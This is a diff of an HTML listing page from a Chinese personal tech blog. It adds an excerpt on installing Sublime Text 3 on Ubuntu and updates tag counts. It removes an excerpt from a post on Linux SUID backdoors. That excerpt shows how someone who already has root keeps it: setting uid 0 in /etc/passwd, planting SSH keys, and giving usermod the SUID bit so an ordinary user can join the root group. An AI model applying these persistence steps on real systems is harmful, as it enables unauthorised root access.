@@ -82,6 +82,68 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
+        <h2><a href="http://wyb0.com/posts/ubuntu-insatll-sublime-text3/">Ubuntu下安装sublime text 3</a></h2>
+
+        
+        <div class="post-meta">
+            <div style="padding:5px 5px 2px 0px;">
+                <i class="fa fa-calendar fa-fw"></i>
+                <time>2016-05-08</time>
+                &nbsp;&nbsp;&nbsp;&nbsp;
+            
+
+                
+
+            
+                
+                
+                
+                    <i class="fa fa-folder fa-fw"></i>
+                    
+                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
+                    
+                
+                
+                &nbsp;&nbsp;&nbsp;&nbsp;
+                
+                
+                
+                    <i class="fa fa-tags fa-fw"></i>
+                    
+                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/software">software</a>
+                    
+                
+                
+            </div>
+        </div>
+    </header>
+
+    
+    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
+        环境：ubuntu14.4
+0x00 安装  添加Sublime Text 3的仓库
+sudo add-apt-repository ppa:webupd8team/sublime-text-3
+ 更新软件库
+sudo apt-get update
+ 安装Sublime Text 3
+sudo apt-get install sublime-text-installer
+  0x01 解决不能输入中文的问题  新建sublime_imfix.c(位于～目录)，写入如下内容
+#include &lt;gtk/gtkimcontext.h&gt; void gtk_im_context_set_client_window (GtkIMContext *context,GdkWindow *window) { GtkIMContextClass *klass; g_return_if_fail (GTK_IS_IM_CONTEXT (context)); klass = GTK_IM_CONTEXT_GET_CLASS (context); if (klass-&gt;set_client_window) klass-&gt;set_client_window (context, window); g_object_set_data(G_OBJECT(context),&quot;window&quot;,window); if(!GDK_IS_WINDOW (window)) return; int width = gdk_window_get_width(window); int height = gdk_window_get_height(window); if(width != 0 &amp;&amp; height !=0) gtk_im_context_focus_in(context); }  将上一步的代码编译成共享库libsublime-imfix.
+    </p>
+
+    
+    <footer>
+        <a href="/posts/ubuntu-insatll-sublime-text3/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+    </footer>
+    
+</article>
+
+
+            
+                
+<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
+<article>
+    <header>
         <h2><a href="http://wyb0.com/posts/ubuntu-basis-set/">Ubuntu初接触(包括搭建LAMP)</a></h2>
 
         
@@ -595,66 +657,6 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
 
 
             
-                
-<hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
-<article>
-    <header>
-        <h2><a href="http://wyb0.com/posts/linux-suid-back-door/">Linux之SUID后门</a></h2>
-
-        
-        <div class="post-meta">
-            <div style="padding:5px 5px 2px 0px;">
-                <i class="fa fa-calendar fa-fw"></i>
-                <time>2016-04-18</time>
-                &nbsp;&nbsp;&nbsp;&nbsp;
-            
-
-                
-
-            
-                
-                
-                
-                    <i class="fa fa-folder fa-fw"></i>
-                    
-                        <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
-                    
-                
-                
-                &nbsp;&nbsp;&nbsp;&nbsp;
-                
-                
-                
-                    <i class="fa fa-tags fa-fw"></i>
-                    
-                        <a class="post-taxonomy-tag" href="http://wyb0.com/tags/%E5%90%8E%E9%97%A8">后门</a>
-                    
-                
-                
-            </div>
-        </div>
-    </header>
-
-    
-    <p style="max-height:130px;overflow:hidden;line-height:26px;position: relative;word-wrap: break-word !important;z-index:1;">
-        SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制
-0x00 为二进制文件添加s权限从而提升为root权限  写sudoers添加用户 //最佳方案
- vim /etc/passwd //将uid和gid改为0 vim /etc/shadow //密文覆盖
- vim root .ssh/证书文件 .ssh这个文件夹和证书的权限要正确，要和原来一致  0x01 SUID主要作用可以是留后门  在root权限下给usermod一个s权限
-# which usermod #得到usermod的路径 /usr/sbin/usermod # chmod u+s /usr/sbin/usermod # ls -l /usr/sbin/usermod -rwsr-x---. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  usermod给其他人一个x权限
-[root@localhost ~]# chmod o+x /usr/sbin/usermod [root@localhost ~]# ls -l /usr/sbin/usermod -rwsr-x--x. 1 root root 98680 Dec 7 2011 /usr/sbin/usermod  切换到普通用户wyb
-[wyb@localhost ~]$ id wyb uid=500(wyb) gid=500(wyb) groups=500(wyb) [wyb@localhost ~]$ usermod -g root wyb [wyb@localhost ~]$ id wyb uid=500(wyb) gid=0(root) groups=0(root) [wyb@localhost ~]$ exit  验证
-    </p>
-
-    
-    <footer>
-        <a href="/posts/linux-suid-back-door/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
-    </footer>
-    
-</article>
-
-
-            
 
             
 
@@ -701,7 +703,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/php" title="php">php(12)</a></li>
         
-            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(34)</a></li>
+            <li style="list-style-type:none;"><a href="http://wyb0.com/topics/python" title="python">python(35)</a></li>
         
             <li style="list-style-type:none;"><a href="http://wyb0.com/topics/server" title="server">server(10)</a></li>
         
@@ -811,7 +813,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/module" title="module">module</a>
-                <sup>13</sup>
+                <sup>14</sup>
             </p>
         
             <p style="display:inline-block;">
@@ -851,7 +853,7 @@ cron每分钟醒来依次查看当前是否有需要运行的命令，最小单�
         
             <p style="display:inline-block;">
                 <a href="http://wyb0.com/tags/python" title="python">python</a>
-                <sup>32</sup>
+                <sup>33</sup>
             </p>
         
             <p style="display:inline-block;">
